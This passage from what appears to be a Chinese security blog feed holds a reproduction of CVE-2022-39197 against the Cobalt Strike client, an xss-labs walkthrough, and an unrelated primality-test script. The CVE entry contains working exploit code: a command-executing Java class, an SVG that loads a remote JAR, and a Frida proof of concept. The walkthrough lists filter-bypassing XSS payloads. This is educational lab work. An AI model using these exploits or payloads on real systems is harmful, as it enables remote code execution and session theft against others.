             &#125;                                                &#125;catch (Exception e)&#123;                                                    continue;                                                &#125;                                            &#125;                                        &#125;                                    &#125;                                &#125;                            &#125;                        &#125;                        catch (IllegalAccessError a)                        &#123;                            continue;                        &#125;                        catch (NoClassDefFoundError b)                        &#123;                            continue;                        &#125;                    &#125;                &#125;            &#125;        &#125; catch(IOException e)&#123;            e.printStackTrace();        &#125;    &#125;    public static void main(String[] args) throws Exception &#123;        getJarName(&quot;cobaltstrike.jar&quot;);    &#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011228203.png" alt="image-20221101105557916"></p><p>用这个脚本成功找到cobaltstrike.jar中满足所有条件的类，一共找到132个，但是有很多都是重复的，除去重复的也就十几个，可以一个一个的分析，看看哪个可以rce</p><p>最终找到setURL()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011249269.png" alt="image-20221101124946165"></p><p>函数调用了loadSVGDocument(),这个函数是用于解析SVG文件的，并且SVG 文件是允许用户插入 JavaScrip代码的</p><pre><code class="java">    public void loadSVGDocument(String url) &#123;        String oldURI = null;        if (this.svgDocument != null) &#123;            oldURI = this.svgDocument.getURL();        &#125;        final ParsedURL newURI = new ParsedURL(oldURI, url);        stopThenRun(new Runnable() &#123; // from class: org.apache.batik.swing.svg.JSVGComponent.1            @Override // java.lang.Runnable            public void run() &#123;                String url2 = newURI.toString();                JSVGComponent.this.fragmentIdentifier = newURI.getRef();                JSVGComponent.this.loader = new DocumentLoader(JSVGComponent.this.userAgent);                JSVGComponent.this.nextDocumentLoader = new SVGDocumentLoader(url2, JSVGComponent.this.loader);                JSVGComponent.this.nextDocumentLoader.setPriority(1);                for (Object svgDocumentLoaderListener : JSVGComponent.this.svgDocumentLoaderListeners) &#123;                    JSVGComponent.this.nextDocumentLoader.addSVGDocumentLoaderListener((SVGDocumentLoaderListener) svgDocumentLoaderListener);                &#125;                JSVGComponent.this.startDocumentLoader();            &#125;        &#125;);    &#125;</code></pre><h2 id="利用SVG执行恶意代码"><a href="#利用SVG执行恶意代码" class="headerlink" title="利用SVG执行恶意代码"></a>利用SVG执行恶意代码</h2><p>SVG 是用于二维图形的基于XML的矢量图像格式，并支持交互性和动画</p><p>svg文件示例：</p><pre><code class="html">&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;&lt;/svg&gt;</code></pre><h3 id="SVG-XSS"><a href="#SVG-XSS" class="headerlink" title="SVG XSS"></a>SVG XSS</h3><p>SVG文件还支持嵌入式javascript代码,利用这点，可以构造xss payload</p><pre><code class="html">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;  &lt;script type=&quot;text/javascript&quot;&gt;    alert(&quot;1&quot;);  &lt;/script&gt;&lt;/svg&gt;</code></pre><p>注意： 上传时，注意内容类型设置为：<code>Content-Type: image/svg+xml</code></p><h3 id="SVG-XXE"><a href="#SVG-XXE" class="headerlink" title="SVG XXE"></a>SVG XXE</h3><p>前面说了 SVG 是基于 XML 的矢量图，因此可以支持 Entity (实体) 功能，因此可以用来 XXE,具体利用参考<a href="https://my.oschina.net/hetianlab/blog/4723160">https://my.oschina.net/hetianlab/blog/4723160</a></p><h3 id="SVG执行java代码"><a href="#SVG执行java代码" class="headerlink" title="SVG执行java代码"></a>SVG执行java代码</h3><p>首先写个命令执行的而已java代码</p><pre><code class="java">import org.w3c.dom.events.Event;import org.w3c.dom.events.EventListener;import org.w3c.dom.svg.EventListenerInitializer;import org.w3c.dom.svg.SVGDocument;import org.w3c.dom.svg.SVGSVGElement;import java.util.*;import java.io.*;public class Exploit implements EventListenerInitializer &#123;    public Exploit() &#123;    &#125;    public void initializeEventListeners(SVGDocument document) &#123;        SVGSVGElement root = document.getRootElement();        EventListener listener = new EventListener() &#123;            public void handleEvent(Event event) &#123;                try &#123;                    Process p = Runtime.getRuntime().exec(&quot;calc&quot;);                &#125; catch (Exception e) &#123;&#125;            &#125;        &#125;;        root.addEventListener(&quot;SVGLoad&quot;, listener, false);    &#125;&#125;</code></pre><p>MANIFEST.MF文件</p><pre><code>Manifest-Version: 1.0SVG-Handler-Class: Exploit</code></pre><p>然后将恶意java代码打包成jar文件</p><p>下一步就是准备SVG文件，</p><pre><code class="html">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.0&quot;&gt;    &lt;script type=&quot;application/java-archive&quot; xlink:href=&quot;http://xxx.xxx.xxx.xxx/EvilJar-1.0-jar-with-dependencies.jar&quot;/&gt;    &lt;text&gt;CVE-2022-39197&lt;/text&gt;&lt;/svg&gt;</code></pre><p>注意：SVG的默认安全策略是在 JAR 与 SVG 文件具有相同来源时才会执行 Java 代码</p><h2 id="RCE复现"><a href="#RCE复现" class="headerlink" title="RCE复现"></a>RCE复现</h2><p>经过上面的折腾，得到最终的payload:</p><pre><code class="html">&lt;html&gt;&lt;object classid=&#39;org.apache.batik.swing.JSVGCanvas&#39;&gt;&lt;param name=&#39;URI&#39; value=&#39;payload&#39;&gt;&lt;/param&gt;&lt;/object&gt;</code></pre><p>网上找到的POC</p><pre><code class="python">import fridaimport timeimport sysdef processInject(target, url):    print(&#39;[+] Spawning target process&#39;)    pid = frida.spawn(target)    session = frida.attach(pid)    frida_script = &#39;&#39;&#39;      var payload=&quot;&lt;html&gt;&lt;object classid=&#39;org.apache.batik.swing.JSVGCanvas&#39;&gt;&lt;param name=&#39;URI&#39; value=&#39;USER_PAYLOAD&#39;&gt;&lt;/param&gt;&lt;/object&gt;&quot;      var pProcess32Next = Module.findExportByName(&quot;kernel32.dll&quot;, &quot;Process32Next&quot;)    Interceptor.attach(pProcess32Next, &#123;        onEnter: function(args) &#123;            this.pPROCESSENTRY32 = args[1];            if(Process.arch == &quot;ia32&quot;)&#123;                this.exeOffset = 36;            &#125;else&#123;                this.exeOffset = 44;            &#125;            this.szExeFile = this.pPROCESSENTRY32.add(this.exeOffset);        &#125;,        onLeave: function(retval) &#123;            if(this.szExeFile.readAnsiString() == &quot;beacon.exe&quot;) &#123;                send(&quot;[!] Found beacon, injecting payload&quot;);                this.szExeFile.writeAnsiString(payload);            &#125;        &#125;    &#125;)    &#39;&#39;&#39;.replace(&quot;USER_PAYLOAD&quot;, url)    script = session.create_script(frida_script)    script.load()    frida.resume(pid)    # make sure payload is triggered on client    print(&quot;[+] Waiting for 100 seconds&quot;)    time.sleep(100)    frida.kill(pid)    print(&#39;[+] Done! Killed beacon process.&#39;)    exit(0)if __name__ == &#39;__main__&#39;:    if len(sys.argv) == 3:        processInject(sys.argv[1], sys.argv[2])    else:        print(&quot;[-] Incorrect Usage!\n\nExample: python3 &#123;&#125; beacon.exe http://10.10.10.2:8080/evil.svg&quot;.format(sys.argv[0]))</code></pre><p>将SVG文件和jar文件放到服务器上，修改SVG中的<code>xlink:href</code>为jar链接</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011229206.png" alt="image-20221101114517102"></p><p>然后用poc模拟上线,beacon.exe是木马文件</p><pre><code>python3 cve-2022-39197.py beacon.exe http://xxx.xxx.xxx.xxx/evil.svg</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011229136.png" alt="image-20221101120607766"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011229313.png" alt="image-20221101120517468"></p><p>点开进程列表，随便点点，成功弹出计算机</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011229550.png" alt="image-20221101121636153"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞号称是脚本小子杀手，蓝队快乐洞。在复现这个漏洞的过程中，很折磨，也很享受，让我学习到关于Swing和SVG的知识，也是我接触java安全的第一步，后面会继续学习java安全</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三个素性检验</title>
      <link href="/2022/03/12/%E4%B8%89%E4%B8%AA%E7%B4%A0%E6%80%A7%E6%A3%80%E9%AA%8C/"/>
      <url>/2022/03/12/%E4%B8%89%E4%B8%AA%E7%B4%A0%E6%80%A7%E6%A3%80%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="Python实现三个素性检验"><a href="#Python实现三个素性检验" class="headerlink" title="Python实现三个素性检验"></a>Python实现三个素性检验</h1><h2 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h2><p>直接运行，根据提示选择模式、输入检验的数n和循环次数k即可</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre><code class="python">import randomimport timedef QuickPower(a,n,p):#快速幂算法   tmp = a   ret =1   while(n &gt;0):       if(n&amp;1):           ret = (ret * tmp) % p       tmp = (tmp * tmp) % p       n&gt;&gt;=1   return retdef Jacobi(n,m):# calc Jacobi(n/m)   n = n%m   if n==0:       return 0   Jacobi2 =1   if not(n&amp;1):#若有n为偶数,计算Jacobi2 = Jacobi(2/m)^(s)其中n = 2^s*t t为奇数       k = (-1)**(((m**2-1)//8)&amp;1)       while not(n&amp;1):           Jacobi2 *= k           n &gt;&gt;=1   if n==1:       return Jacobi2   return Jacobi2 * (-1)**(((m-1)//2*(n-1)//2)&amp;1) * Jacobi(m%n,n)def Exgcd(r0,r1):# calc ax+by = gcd(a, b) return x   x0,y0 =1,0   x1,y1 =0,1   x,y = r0,r1   r = r0 % r1   q = r0 // r1   while r:       x,y = x0 - q * x1,y0 - q * y1       x0,y0 = x1,y1       x1,y1 = x,y       r0 = r1       r1 = r       r = r0 % r1       q = r0 // r1   return xdef Fermat(x,T):# Fermat素性判定       if x &lt;2:               return False       if x&lt;=3:               return True       if x%2==0 or x%3==0:               return False       for i in range(T):               ran = random.randint(2,x-2)#随机取[2, x-2]的一个整数               if QuickPower(ran,x-1,x) !=1:                       return False       return Truedef Solovay_Stassen(x,T):# Solovay_Stassen素性判定   if x &lt;2:       return False   if x &lt;=3:       return True   if x%2==0 or x%3==0:       return False   for i in range(T):#随机选择T个整数       ran = random.randint(2,x-2)       r = QuickPower(ran,(x-1)//2,x)       if r !=1 and r != x-1:           return False       if r == x-1:           r = -1       if r != Jacobi(ran,x):           return False   return Truedef MillerRabin(x,ran):# x-1 = 2^s*t   tx = x-1   s2 = tx&amp;(~tx+1)#取出最后一位以1开头的二进制 即2^s   r = QuickPower(ran,tx//s2,x)   if r ==1 or r == tx:       return True   while s2&gt;1:#从2^s -&gt; 2^1循环s次       r = (r*r)%x       if r ==1:           return False       if r == tx:           return True       s2 &gt;&gt;=1   return Falsedef MillerRabin_init(x,T):#Miller-Rabin素性判定   if x &lt;2:       return False   if x &lt;=3:       return True   if x%2==0 or x%3==0:       return False   for i in range(T):#随机选择T个整数       ran = random.randint(2,x-2)       if not MillerRabin(x,ran):           return False   return Truedef CRT(b,m,n):# calc x = b[] % m[]   M =1   for i in range(n):       M *= m[i]   ans =0   for i in range(n):       ans += b[i] * M // m[i] * Exgcd(M//m[i],m[i])   return ans%Mif __name__ == &quot;__main__&quot;:    print(&#39;1 ：费马素性检验\n2 : Solovay_Stassen素性检验\n3 : 米勒.拉宾素性检验\n4 : 三个素性检验一起进行\n&#39;)    cho=input(&#39;选择运行模式：&#39;)    if cho!=&#39;1&#39;and cho!=&#39;2&#39;and cho!=&#39;3&#39;and cho!=&#39;4&#39; :        print(&#39;输入错误！！&#39;)        exit()       n = int(input(&quot;请输入需要检测的整数n：&quot;))    k = int(input(&quot;请输入循环次数k：&quot;))    print(&#39;*&#39;*100)    if cho==&#39;1&#39;:        a=Fermat(n,k)        print(&#39;费马素性检验结果：&#39;,a)    elif cho==&#39;2&#39;:        b=Solovay_Stassen(n,k)        print(&#39;Solovay_Stassen素性检验结果：&#39;,b)    elif cho==&#39;3&#39;:        c=MillerRabin_init(n,k)        print(&#39;米勒.拉宾素性检验结果：&#39;,c)    elif cho==&#39;4&#39;:        start = time.perf_counter()        a=Fermat(n,k)        end = time.perf_counter()        print(&#39;费马素性检验结果：&#39;,a)        print(&quot;费马素性检验运行耗时&quot;,end-start)        print(&#39;\n&#39;)        start = time.perf_counter()        b=Solovay_Stassen(n,k)        end = time.perf_counter()        print(&#39;Solovay_Stassen素性检验结果：&#39;,b)        print(&quot;Solovay_Stassen素性检验运行耗时&quot;,end-start)        print(&#39;\n&#39;)        start = time.perf_counter()        c=MillerRabin_init(n,k)        end = time.perf_counter()        print(&#39;米勒.拉宾素性检验结果：&#39;,c)        print(&quot;米勒.拉宾素性检验运行耗时&quot;,end-start)    </code></pre><h2 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220312230127542.png" alt="image-20220312230127542"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220312230225020.png" alt="image-20220312230225020"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 信安数学基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs靶场练习</title>
      <link href="/2022/02/17/xss-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2022/02/17/xss-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="xss-labs靶场练习"><a href="#xss-labs靶场练习" class="headerlink" title="xss-labs靶场练习"></a>xss-labs靶场练习</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><img src="https://raw.githubusercontent.com/todis21/image/main/img/1645071060231.png" alt="1645071060231" style="zoom: 50%;" /><p>观察url的构造，这里是向服务器提交了个名为<code>name</code>的参数,值为<code>text</code>，并且值和值的长度都在页面有回显。</p><p>查看网页源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/QQ%E6%88%AA%E5%9B%BE20220217142356.png" alt="QQ截图20220217142356"></p><p>name参数的值直接插入到了<h2></h2>标签之中。那么这样看来这一关主要就是考察反射型XSS。</p><pre><code>payload:name=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217143223741.png" alt="image-20220217143223741"></p><p>从url地址来看，依然是get方式传递参数，所以猜测考察的还是反射型XSS。只不过这一关将参数名换成了keyword。</p><p>查看页面源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217143513098.png" alt="image-20220217143513098"></p><p>这里有两个地方回显值的地方，利用第一关的payload试试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217143809347.png" alt="image-20220217143809347"></p><p>观察源码，第一处回显处的特殊字符被编码了，不能利用，第二处的回显处可以完整的回显值，可以利用这里构造payload,</p><p>这里需要构造闭合</p><pre><code>&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>url构造同上一关</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217144449415.png" alt="image-20220217144449415"></p><p>页面源码和上一关的差不多，只是双引号变成单引号</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217144758278.png" alt="image-20220217144758278"></p><p>尝试构造payload：</p><pre><code>&#39;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p>发现并没有弹窗，继续观察源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217145017841.png" alt="image-20220217145017841"></p><p>发现这关的&lt;,&gt;被编码成了html实体。经过查看php文件，在这两处都用htmlspecialchars()函数进行了处理。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217145359528.png" alt="image-20220217145359528"></p><p>所以这里不能用含有&lt;&gt;的payload</p><p>这里可以通过<code>&lt;input&gt;</code>标签的一些特殊事件来执行js代码:</p><pre><code>&#39; onmouseover=javascript:alert(1) &#39;</code></pre><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217150532899.png" alt="image-20220217150532899"></p><p>查看源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217150738232.png" alt="image-20220217150738232"></p><p>这一关只是把上一关的单引号变成了双引号,payload构造如下</p><pre><code>&quot; onmouseover=javascript:alert(1) &quot;</code></pre><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217151227524.png" alt="ccc"></p><p>查看页面源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217153208676.png" alt="image-20220217153208676"></p><p>这和上一关的源码差不多，直接用上一关的payload，无法弹窗</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217153541015.png" alt="image-20220217153541015"></p><p>发现<code>onmouseover</code>变成了<code>o_nmouseover</code>,经过测试<code>&lt;script&gt;</code>和<code>onclick</code>也被_分隔了</p><p>这里不用<code>&lt;input&gt;</code>标签了，把它闭合掉,用a标签试试</p><pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;link&lt;/a&gt; &lt;&quot;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217154340891.png" alt="image-20220217154340891"></p><p>点击link弹窗。进入下一关</p><h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217155856005.png" alt="image-20220217155856005"></p><p>源码和上一关差不多</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217160010837.png" alt="image-20220217160010837"></p><p>尝试使用上一关的payload,并没有出现弹窗</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217160114004.png" alt="image-20220217160114004"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217160153498.png" alt="image-20220217160153498"></p><p>发现这里的<code>href</code>也被<code>_</code>分隔了</p><p>因为html对大小写不敏感，即不区分大小写，这里可以试试下面的payload</p><pre><code>&quot;&gt;&lt;a Href=&quot;javascript:alert(111)&quot;&gt;link&lt;/a&gt; &lt;&quot;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217161822841.png" alt="image-20220217161822841"></p><p>点击link弹窗。进入下一关</p><h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217210116917.png" alt="image-20220217210116917"></p><p>页面源码与上一关的雷同，用上一关的payload：<code>&quot;&gt;&lt;a Href=&quot;javascript:alert(1)&quot;&gt;link&lt;/a&gt; &lt;&quot;</code>试试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217210446573.png" alt="image-20220217210446573"></p><p>发现这里过滤了<code>script</code>和<code>href</code>,可以用双写绕过，即在script里面再插入一个script,如<code>scrscriptipt</code>,</p><p>当script被过滤后，剩下的拼接起来刚好能组合成script,href也同理</p><p>payload</p><pre><code>&quot;&gt;&lt;a hRhrefef=&quot;javascriscriptpt:alert(&#39;111&#39;)&quot;&gt;link&lt;/a&gt;&lt;&quot;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217211132648.png" alt="image-20220217211132648"></p><p>点击link弹窗。进入下一关</p><h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217211535003.png" alt="image-20220217211535003"></p><p>这关多了一个“友情链接”，按照套路，这里应该是利用点</p><p>首先先查看页面源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217212026427.png" alt="image-20220217212026427"></p><p>回显值的地方有两个，用上一关的payload试试水</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217212158383.png" alt="image-20220217212158383"></p><p>可以发现，第一个回显处被htmlspecialchars()函数进行了处理，第二个回显处href和script都被<code>_</code>分隔了</p><p>可以对第二处进行构造payload</p><pre><code>javascript:alert(1)</code></pre><p>这里的scrpit会被分隔，所以将它进行unicode编码</p><pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217213124300.png" alt="image-20220217213124300"></p><p>点击<code>友情链接</code>即可弹窗</p><h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217214219071.png" alt="image-20220217214219071"></p><p>查看源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217214603403.png" alt="image-20220217214603403"></p><p>这里显示链接不合法，经过测试，提交的内容里只要含有<code>http://</code>就合法,https:&#x2F;&#x2F;不行</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217215516760.png" alt="image-20220217215516760"></p><p>尝试payload ： javascript:alert(http:&#x2F;&#x2F;)</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217215653634.png" alt="image-20220217215653634"></p><p>发现script被分隔了，可以将script进行unicode编码绕过</p><pre><code>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(&#39;http://&#39;)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217220749312.png" alt="image-20220217220749312"></p><p>点击<code>友情链接</code>即可弹窗</p><h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217222013957.png" alt="image-20220217222013957"></p><p>传递keyword值为<code>&lt;script&gt;alert(111)&lt;/script&gt;</code>进行测试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217222505101.png" alt="image-20220217222505101"></p><p>可以看到回显值的地方被htmlspecialchars()函数进行了处理，还有三个隐藏的输入框，尝试向它们传值</p><pre><code>?keyword=1111&amp;t_link=222&amp;t_history=333&amp;t_sort=444</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217223126794.png" alt="image-20220217223126794"></p><p>发现t_sort有回显，在这里构造payload</p><pre><code>t_sort=&quot; onmouseover=javascript:alert(1) &quot; type=&quot;text</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217223555926.png" alt="image-20220217223555926"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217223608521.png" alt="image-20220217223608521"></p><h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218080510169.png" alt="image-20220218080510169"></p><p>这关的页面源码和上一关的雷同，多了个隐藏的输入框<code>t_ref</code>,value值为上一关的url</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218081735399.png" alt="image-20220218081735399"></p><p>这里可以猜测，这个参数的值，是来源于请求头Referer,通过referer来传入payload</p><pre><code>&quot; onmouseover=javascript:alert(1) &quot; type=&quot;text</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218082110453.png" alt="image-20220218082110453"></p><p>可以弹窗进入下一关</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218082133492.png" alt="image-20220218082133492"></p><h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218082535475.png" alt="image-20220218082535475"></p><p>这一关又多了个隐藏的输入框<code>t_ua</code>,看它的值可以知道它的值来源于User-Agent</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218082846721.png" alt="image-20220218082846721"></p><p>通过User-Agent传入上一关的payload即可弹窗</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218083019729.png" alt="image-20220218083019729"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218083052475.png" alt="image-20220218083052475"></p><h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218092723595.png"></p><p>查看页面源码，发现这次的隐藏输入框是<code>t_cook</code>,它的值是来自Cookies</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218093119924.png"></p><p>同样的套路，吧上一关的payload加到cookie即可</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218093319008.png"></p><p>成功弹窗进入下一关</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218093341818.png"></p><h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h2><p>这一关是Exif xss,php的<code>exif_read_data</code>函数读出exif信息，读出的值直接未经过滤的输出，就会导致Xss的发生。</p><p>网站打不开，这关跳过</p><h2 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218113901942.png" alt="image-20220218113901942"></p><p>查看源码发现<code>angular.min.js</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218114103327.png" alt="image-20220218114103327"></p><p>URL的src参数回显在下面的ng-include</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218114236036.png" alt="image-20220218114236036"></p><p>ng-include相当于php的include函数，所以我们包含一个有XSS漏洞的URL就可触发这里的XSS。</p><p>在本地写个html文件，把地址传给src即可</p><pre><code>&lt;input type=&quot;text&quot; name=&quot;&quot; onclick=alert(&#39;xss&#39;)&gt;</code></pre><pre><code>http://localhost/xss-labs/level15.php?src=&quot;http://localhost/2.html&quot;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218114850262.png" alt="image-20220218114850262"></p><h2 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218115116596.png" alt="image-20220218115116596"></p><p>观察url构造，发现这一关是通过get一个keyword来传递参数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218115243816.png" alt="image-20220218115243816"></p><p>参数值回显在<code>&lt;center&gt;</code>标签中，使用<code>&lt;img&gt;</code>标签来弹窗</p><pre><code>&lt;img src=&#39;&#39; onerror=alert(111)&gt;</code></pre><pre><code>http://localhost/xss-labs/level16.php?keyword=&lt;img src=&#39;&#39; onerror=alert(111)&gt;</code></pre><p>传值后没有弹窗，观察页面源码得知，空格被转义了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218115733037.png" alt="image-20220218115733037"></p><p>空格可以用<code>%20 %09 %0a %0b %0c %0d %a0 %00</code>代替，经过测试<code>%0d</code>可以用</p><p>所以payload为</p><pre><code>http://localhost/xss-labs/level16.php?keyword=&lt;img%0dsrc=&#39;&#39;%0donerror=alert(111)&gt;</code></pre><p>弹窗成功</p><h2 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218120659720.png" alt="image-20220218120659720"></p><p>这有个flash，但是这关和它没有关系</p><p>发现url有个?arg01&#x3D;a&amp;arg02&#x3D;b，再观察一下页面源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218121009693.png" alt="image-20220218121009693"></p><p>发现两个参数的值回显在<code>&lt;embed&gt;</code>标签中，可以通过构该标签的特殊事件进行弹窗</p><pre><code>?arg01=a%0aonmouseover&amp;arg02=alert(1)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218122200252.png" alt="image-20220218122200252"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218122212241.png" alt="image-20220218122212241"></p><h2 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h2><p>这一关的页面源码和上一关的没什么区别，直接用上一关的payload即可</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218122616195.png" alt="image-20220218122616195"></p><h2 id="Level-19-x2F-20"><a href="#Level-19-x2F-20" class="headerlink" title="Level 19&#x2F;20"></a>Level 19&#x2F;20</h2><p>摆烂！</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-7靶场练习</title>
      <link href="/2021/12/31/DC-7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/12/31/DC-7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
